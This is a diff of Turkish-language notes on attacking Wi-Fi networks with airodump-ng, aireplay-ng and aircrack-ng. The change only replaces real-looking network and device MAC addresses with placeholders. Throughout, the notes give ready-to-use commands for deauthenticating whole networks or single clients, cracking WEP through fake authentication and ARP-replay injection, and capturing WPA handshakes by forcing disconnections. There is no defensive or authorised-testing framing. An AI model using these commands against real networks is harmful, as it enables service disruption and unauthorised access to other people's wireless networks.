@@ -11,9 +11,9 @@ airmon-ng stop wlan0mon
 airodump-ng wlan0mon
 
  Belli bir ağa özel bilgi edinmek;
-airodump-ng --bssid 88:41:FC:19:B4:5B --channel 1 wlan0mon
+airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 1 wlan0mon
 
-airodump-ng --bssid 88:41:FC:19:B4:5B --channel 1 --write wepcrack wlan0mon
+airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 1 --write wepcrack wlan0mon
  --write = Yapılan işlemlerin sonucunu "wepcrack" içine kaydet.
 
 
@@ -21,10 +21,10 @@ airodump-ng --bssid 88:41:FC:19:B4:5B --channel 1 --write wepcrack wlan0mon
 
 	DEAUTHENTICATION ATTACK
  Tüm ağı yetkisizlendirmek;
-aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B wlan0mon
+aireplay-ng --deauth 1000 -a AA:BB:CC:DD:EE:FF wlan0mon
 
  Belli bir cihazı yetkisizlendirmek;
-aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B -c 66:51:87:86:23:59 wlan0mon	[OPPO R4L, T]
+aireplay-ng --deauth 1000 -a AA:BB:CC:DD:EE:FF -c AA:BB:CC:DD:EE:FF wlan0mon	[OPPO R4L, T]
  --deauth = atılacak paket sayısı
  -a = bssid
  -c = saldırılmak istenen cihaz
@@ -32,7 +32,7 @@ aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B -c 66:51:87:86:23:59 wlan0mon	[OP
 
 
 	WEP CRASH
-airodump-ng --channel 1 --bssid 88:41:FC:19:B4:5B --write wepdecrypt wlan0mon
+airodump-ng --channel 1 --bssid AA:BB:CC:DD:EE:FF --write wepdecrypt wlan0mon
 aircrack-ng wepdecrypt-01.cap
 
 işlem sonucu:
@@ -47,14 +47,14 @@ işlem sonucu:
  ("WEP" için çünkü "WPA" içinde FakeAuth ile "IV" ürettiremeyiz.)
  (interneti kullanamayız ve herhangi bir parolaya erişemeyiz.)
 
-aireplay-ng --fakeauth 0 -a 88:41:FC:19:B4:5B -h 6C-60-EB-24-F8-09 wlan0mon
+aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h AA-BB-CC-DD-EE-FF wlan0mon
 
  Kendi mac adresimizi öğrenmek için; 
  ifconfig > wlan0mon > unspec'ten sonraki 6 hane.
  -h = mac adress
 
  IV Ürettirmek için (paket enjeksiyonu);
-aireplay-ng --arpreplay -b 88:41:FC:19:B4:5B -h 6C-60-EB-24-F8-09 wlan0mon
+aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h AA-BB-CC-DD-EE-FF wlan0mon
 aircrack-ng wepcrack-01.cap	-> "aircrack-ng"yi "wepcrack-01.cap"e karşı çalıştır.
 
 	işlem sonucu:
@@ -68,7 +68,7 @@ aircrack-ng wepcrack-01.cap	-> "aircrack-ng"yi "wepcrack-01.cap"e karşı çalı
 	WPA CRUSH [HANDSHAKE]
  Handhake yakalamak için o ağdaki birinin ağa bağlanması veya ağdan düşmesi gerekir.
  Daha hızlı sonuç almak için herhangi bir cihaza --deauth saldırısı yaparız. 5 paket yeterli olacaktır.
-aireplay-ng --deauth 5 -a 88:41:FC:19:B4:5B -c 66:51:87:86:23:59 wlan0mon
+aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c AA:BB:CC:DD:EE:FF wlan0mon
 
  Sonuç:
 	Handshake yakalandı.
